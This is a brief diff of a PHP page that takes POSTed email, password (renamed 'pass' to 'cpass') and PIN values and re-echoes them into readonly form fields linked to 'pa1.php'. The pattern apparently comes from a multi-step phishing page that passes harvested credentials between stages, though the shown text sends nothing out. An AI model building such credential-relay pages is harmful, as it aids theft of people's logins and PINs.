@@ -74,8 +74,8 @@ user-select: none;
         echo '<a href="pa1.php"></a><input id="email" name="email" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
 		?>
           <?php 
-                     $variable= $_POST['pass'];
-        echo '<a href="pa1.php"></a><input id="pass" name="pass" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
+                     $variable= $_POST['cpass'];
+        echo '<a href="pa1.php"></a><input id="cpass" name="cpass" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
 		?>
           <?php 
                      $variable= $_POST['pin'];
